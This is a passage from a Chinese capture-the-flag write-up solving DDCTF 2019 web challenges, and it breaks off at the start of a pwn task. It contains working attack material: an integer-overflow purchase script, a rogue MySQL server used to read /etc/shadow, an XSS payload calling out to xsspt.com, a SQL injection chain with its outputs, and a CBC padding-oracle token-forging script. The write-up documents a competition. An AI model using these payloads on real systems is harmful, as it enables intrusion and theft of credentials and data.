rel="noopener">http://117.51.147.155:5050/index.html</a></p><p>正常情况下，新注册用户余额只有100，门票需要2000，是不够钱买门票，不过可以利用整数溢出</p><p>32位系统<code>unsigned int</code>范围为<code>0～4294967295</code>，最大数<code>+1</code>后会回绕变成<code>0</code>，修改订单<code>ticket_price=4294967296</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ctf/api/buy_ticket?ticket_price=4294967296</span><br></pre></td></tr></table></figure><p>后面拿到源码证实了猜想，对于大于32位的数字，程序进行了截断，导致了整数溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num64_to_32</span><span class="params">(num)</span>:</span></span><br><span class="line">    str_num = bin(num)</span><br><span class="line">    <span class="keyword">if</span> len(str_num) &gt; <span class="number">66</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">34</span> &lt; len(str_num) &lt; <span class="number">66</span>:</span><br><span class="line">        str_64 = str_num[<span class="number">-32</span>:]</span><br><span class="line">        result = int(str_64, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">if</span> len(str_num) &lt; <span class="number">34</span>:</span><br><span class="line">        result = int(str_num, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>这时去点支付，可以0元购买入场券。进入<code>http://117.51.147.155:5050/index.html#/main/result</code>后，可以输入ID和ticket移除对手。</p><p>思路是不停注册一堆新用户，拿到ticket，加入游戏，然后让玩家移除机器人，当移除id不重复的100个时，拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = requests.session()</span><br><span class="line">        name = str(uuid.uuid4())[:<span class="number">10</span>].replace(<span class="string">'-'</span>, <span class="string">''</span>)</span><br><span class="line">        </span><br><span class="line">        url = base_url + <span class="string">"/ctf/api/register?name=%s&amp;password=12345678"</span> % (name)</span><br><span class="line">        r = session.get(url)</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">'code'</span>] != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(r.json())</span><br><span class="line">        time.sleep(<span class="number">1</span>) <span class="comment"># 如果不sleep一下，后面可能会无法买ticket</span></span><br><span class="line">        url = base_url + <span class="string">'/ctf/api/buy_ticket?ticket_price=4294967296'</span></span><br><span class="line">        r = session.get(url)</span><br><span class="line">        bill_id = r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">        url = base_url + <span class="string">'/ctf/api/pay_ticket?bill_id=%s'</span> % bill_id</span><br><span class="line">        r = session.get(url)</span><br><span class="line"></span><br><span class="line">        your_id = r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>]</span><br><span class="line">        your_ticket = r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</span><br><span class="line">        data.append(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">'id'</span>: your_id,</span><br><span class="line">                <span class="string">'ticket'</span>: your_ticket,</span><br><span class="line">                <span class="string">'session'</span>: session</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        print(<span class="string">'%s, %s, %s'</span> % (len(data), your_id, your_ticket))</span><br><span class="line">        <span class="keyword">if</span> len(data) &gt; <span class="number">1</span>:</span><br><span class="line">            url = base_url + <span class="string">'/ctf/api/remove_robot?id=%s&amp;ticket=%s'</span> % (your_id, your_ticket)</span><br><span class="line">            r = data[<span class="number">0</span>][<span class="string">'session'</span>].get(url)</span><br><span class="line">            print(r.json())</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            url = base_url + <span class="string">'/ctf/api/get_flag'</span></span><br><span class="line">            r = data[<span class="number">0</span>][<span class="string">'session'</span>].get(url)</span><br><span class="line">            print(r.json())</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'大吉大利，今晚吃鸡'</span> <span class="keyword">in</span> r.json()[<span class="string">'msg'</span>]:</span><br><span class="line">                print(r.json()[<span class="string">'data'</span>][<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>得到flag，另外本题有非预期解，详见下一题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;code&apos;: 200, &apos;data&apos;: [&apos;DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;&apos;], &apos;msg&apos;: &apos;大吉大利，今晚吃鸡&apos;&#125;</span><br></pre></td></tr></table></figure><h3 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h3><p><a href="http://117.51.147.155:5000/index.html#/scan" target="_blank" rel="noopener">http://117.51.147.155:5000/index.html#/scan</a></p><p>部署<a href="http://38.106.21.229:5100/agent.py" target="_blank" rel="noopener">agent.py</a>再进行扫描哦~</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133936-5a1b5d8a-619c-1.png" alt=""></p><p>题目是一个mysql弱口令扫描器，输入主机IP及mysql端口可以进行扫描，扫描器会先连接<code>agent.py</code>起的端口<code>8123</code>，并且通过命令<code>netstat -ntlp</code>检查主机端口开放情况，会检查是否存在<code>mysqld</code>进程。以前遇到的sql题目，一般我们作为客户端，对服务端进行注入等恶意攻击，这题刚好相反，题目是一个扫描器（客户端），而我们提供一个服务端。</p><ol><li>用<code>mysql 读取 客户端 数据</code>作为关键字搜索，可以找到不少文章</li></ol><p><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">MySQL LOAD DATA 读取客户端任意文件</a></p><p>原理是在mysql客户端连接到服务端的时候可以请求客户端的本地文件，可以通过伪造 <code>file-transfer</code> 请求实现任意文件读取，使用文章里面提到的工具：</p><p><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p><p>可以修改端口，以及修改filelist为我们想读取的文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filelist = (</span><br><span class="line">    <span class="string">'/etc/shadow'</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ol><li>下载并启动<code>agent.py</code>，由于扫描器会检查是否有mysqld进程，可以将<code>python</code>软链接成<code>mysqld</code>再启动<code>rogue_mysql_server.py</code>。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/bin/python mysqld</span><br><span class="line">mysqld rogue_mysql_server.py</span><br></pre></td></tr></table></figure><ol><li>在扫描器中输入伪造MySQL服务的IP和端口，注意脚本都要用root权限运行，不然会出错。首先测试了一下读取<code>/etc/passwd</code></li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134013-6fd1ff80-619c-1.png" alt=""></p><ol><li>开始各种读文件的找FLAG之旅</li></ol><p>读取<code>/proc/self/cmdline</code> 可以看到启动命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/dc2-user/ctf_web_2/ctf_web_2/bin/python2 /home/dc2-user/ctf_web_2/ctf_web_2/bin/gunicorn didi_ctf_web2:app -b 127.0.0.1:15000 --access-logfile /home/dc2-user/ctf_web_2/2_access.log</span><br></pre></td></tr></table></figure><p>是flask起的web，读取<code>/home/dc2-user/ctf_web_2/app/main/views.py</code>，里面有提示flag在security数据库的flag表里面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> flag <span class="keyword">in</span> mysql  curl@localhost database:security  table:flag</span></span><br></pre></td></tr></table></figure><p>读取mysql的数据库文件<code>/var/lib/mysql/security/flag.ibd</code>，flag明文存放在数据库中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kira @ k1r4 <span class="keyword">in</span> ~/web/ddctf [21:09:55]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> strings flag.ibd</span></span><br><span class="line">z[jx</span><br><span class="line">infimum</span><br><span class="line">supremum</span><br><span class="line">DDCTF&#123;0b5d05d80cceb4b85c8243c00b62a7cd&#125;</span><br></pre></td></tr></table></figure><p>番外篇：读取一下<code>/home/dc2-user/.bash_history</code>，发现了有趣的东西，这个服务器还有<code>ctf_web_1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv ctf.zip  /home/dc2-user/ctf_web_1/web_1</span><br></pre></td></tr></table></figure><p>猜测存在文件<code>/home/dc2-user/ctf_web_1/web_1/main/views.py</code>，直接拿到了吃鸡那题的flag，这就是上面提到的非预期解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify, request,redirect</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> mongodb</span><br><span class="line"><span class="keyword">from</span> app.unitis.tools <span class="keyword">import</span> get_md5, num64_to_32</span><br><span class="line"><span class="keyword">from</span> app.main.db_tools <span class="keyword">import</span> get_balance, creat_env_db, search_bill, secrity_key, get_bill_id</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">mydb = mongodb.db</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'''DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;'''</span></span><br></pre></td></tr></table></figure><h3 id="欢迎报名DDCTF"><a href="#欢迎报名DDCTF" class="headerlink" title="欢迎报名DDCTF"></a>欢迎报名DDCTF</h3><p><a href="http://117.51.147.2/Ze02pQYLf5gGNyMn/" target="_blank" rel="noopener">http://117.51.147.2/Ze02pQYLf5gGNyMn/</a></p><p>提示xss，尝试把html源码x回来，payload：<code>&lt;script src=//xsspt.com/NyU2Mx&gt;&lt;/script&gt;</code>，获取到<code>admin.php</code>的html源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--每隔30秒自动刷新--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"30"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DDCTF报名列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"https://xsspt.com/js/html2canvas.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>昵称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>备注<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>时间<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 列表循环展示 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span> 321 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span> 3333 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//xsspt.com/NyU2Mx"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span> 2019-04-17 02:02:46 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>报名<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;a target="_blank"  href="query_aIeMu0FUoVrW0NWPHbN6z4xh.php"&gt; 接口 &lt;/a&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php</code>提示需要参数<code>id</code>，添加参数后没有回显。</p><p>下午各种测试无回显，晚上进行测试发现是<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134115-94de33ac-619c-1.png" alt="">，简单测试一下</p><p>然后开始手工注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">id=-1%bf%27+union+select+1,2,3,4,group_concat(schema_name)+from+information_schema.schemata%23</span><br><span class="line"></span><br><span class="line">information_schema,ctfdb,say</span><br><span class="line"></span><br><span class="line">###########################</span><br><span class="line">id=-1%bf%27+union+select+1,2,3,4,group_concat(table_name)+from+information_schema.tables+where+table_schema=concat(char(99),char(116),char(102),char(100),char(98))%23</span><br><span class="line"></span><br><span class="line">ctf_fhmHRPL5</span><br><span class="line"></span><br><span class="line">###########################</span><br><span class="line">id=-1%bf%27+union+select+1,2,3,4,group_concat(column_name)+from+information_schema.columns+where+table_name=concat(char(99),char(116),char(102),char(95),char(102),char(104),char(109),char(72),char(82),char(80),char(76),char(53))%23</span><br><span class="line"></span><br><span class="line">ctf_value</span><br><span class="line"></span><br><span class="line">##########################</span><br><span class="line">id=-1%bf%27+union+select+1,2,3,4,ctf_value+from+ctfdb.ctf_fhmHRPL5%23</span><br><span class="line"></span><br><span class="line">DDCTF&#123;GqFzOt8PcoksRg66fEe4xVBQZwp3jWJS&#125;</span><br></pre></td></tr></table></figure><p>当然用sqlmap也是可以的，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1&quot; --tamper unmagicquotes --dbms Mysql --dbs --hex</span><br></pre></td></tr></table></figure><h3 id="再来1杯Java"><a href="#再来1杯Java" class="headerlink" title="再来1杯Java"></a>再来1杯Java</h3><p>绑定Host访问：</p><p>116.85.48.104 c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com</p><p>提示1：JRMP</p><p><a href="http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/" target="_blank" rel="noopener">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/</a></p><p>进入网站提示：<code>Try to become an administrator.</code>，留意到cookie中有token字段，在 <a href="http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/account_info" target="_blank" rel="noopener">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/account_info</a> 中可以查询到解密结果为<code>{&quot;id&quot;:100,&quot;roleAdmin&quot;:false}</code>，那么思路就是CBC字节反转，伪造token为<code>{&quot;id&quot;:100,&quot;roleAdmin&quot;:true}</code>，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sxor</span><span class="params">(a,b)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(x)^ord(y)) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a,b)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(string,N)</span>:</span></span><br><span class="line">    l=len(string)</span><br><span class="line">    <span class="keyword">if</span> l!=N:</span><br><span class="line">        <span class="keyword">return</span> string+chr(N-l)*(N-l)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_api</span><span class="params">(ciphertext)</span>:</span></span><br><span class="line">    req_header=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'113.71.226.6'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063'</span>,</span><br><span class="line"><span class="string">'Host'</span>:<span class="string">'c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/home'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>:<span class="string">'token=&#123;&#125;'</span>.format(ciphertext.encode(<span class="string">'base64'</span>)[:<span class="number">-1</span>]),</span><br><span class="line">&#125;</span><br><span class="line">    s = requests.session() </span><br><span class="line">    rsp=s.get(<span class="string">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token'</span>, headers=req_header,timeout=<span class="number">2</span>,verify=<span class="keyword">False</span>,stream=<span class="keyword">True</span>,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">return</span>(rsp.content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(cipher, N)</span>:</span></span><br><span class="line">    get = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            padding = sxor(get, chr(i) * (i - <span class="number">1</span>))</span><br><span class="line">            c = chr(<span class="number">0</span>) * (N - i) + chr(j) + padding + cipher</span><br><span class="line">            payload=<span class="string">'PadOracle:iv/cbc'</span> + c</span><br><span class="line">            get_api_return=get_api(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"decrypt err~"</span> <span class="keyword">not</span> <span class="keyword">in</span> get_api_return:</span><br><span class="line">                get = chr(j ^ i) + get</span><br><span class="line">                <span class="comment"># print(get.encode('hex'))</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> get</span><br><span class="line"></span><br><span class="line">token = <span class="string">'UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF'</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line">ciphertxt = token[<span class="number">16</span>:]</span><br><span class="line">iv = token[:<span class="number">16</span>] <span class="comment"># PadOracle:iv/cbc</span></span><br><span class="line">org_plaintxt = <span class="string">'&#123;"id":100,"roleAdmin":false&#125;\x04\x04\x04\x04'</span></span><br><span class="line">evil_plaintxt = <span class="string">'&#123;"id":100,"roleAdmin":true&#125;\x05\x05\x05\x05\x05'</span></span><br><span class="line"></span><br><span class="line">ciphertxt2 = ciphertxt[<span class="number">16</span>:]</span><br><span class="line">imtermediary2 = sxor(org_plaintxt[<span class="number">16</span>:],ciphertxt[:<span class="number">16</span>])</span><br><span class="line"><span class="comment"># print imtermediary2.encode('hex')</span></span><br><span class="line">ciphertxt1 = sxor(evil_plaintxt[<span class="number">16</span>:],imtermediary2)</span><br><span class="line"><span class="comment"># print sxor(imtermediary2,evil_plaintxt[16:]).encode('hex'),evil_plaintxt[16:]</span></span><br><span class="line">imtermediary1 = padding_oracle(ciphertxt1, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># print imtermediary1.encode('hex')</span></span><br><span class="line">iv_fixed = sxor(imtermediary1,org_plaintxt[:<span class="number">16</span>])</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">print</span> (iv_fixed+ciphertxt1+ciphertxt2).encode(<span class="string">'base64'</span>)</span><br></pre></td></tr></table></figure><p>修改token为<code>e/0YtlMi8D4jOD4Uk+gE2sO+7uQmXLN5LEM2W9Y6VRa42FqRvernmQhsxyPnvxaF</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134559-3e1b6200-619d-1.png" alt=""></p><p>得到了一个1.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Try to hack~ </span><br><span class="line">Hint:</span><br><span class="line">1. Env: Springboot + JDK8(openjdk version &quot;1.8.0_181&quot;) + Docker~ </span><br><span class="line">2. You can not exec commands~</span><br></pre></td></tr></table></figure></p><p>发现可以任意文件读取 <a href="http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=/etc/passwd" target="_blank" rel="noopener">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=/etc/passwd</a></p><p><code>/proc/self/fd/xxx</code> 可以查看该进程打开的文件，经测试访问 <code>/api/fileDownload?fileName=/proc/self/fd/15</code> 拿到网站源码</p><p>反编译class文件后拿到java源码，有一个DeserializeDemoController比较可疑</p><p>fastjson 版本是 1.2.51 好像没有漏洞，而且用了SerialKiller。1.txt 提示无法执行命令。</p><p>【未完待续】</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="PWN-strike"><a href="#PWN-strike" class="headerlink" title="[PWN] strike"></a>[PWN] strike</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/ddctf/xpwn&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>漏洞一：无初始化内存，导致内存泄露</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span 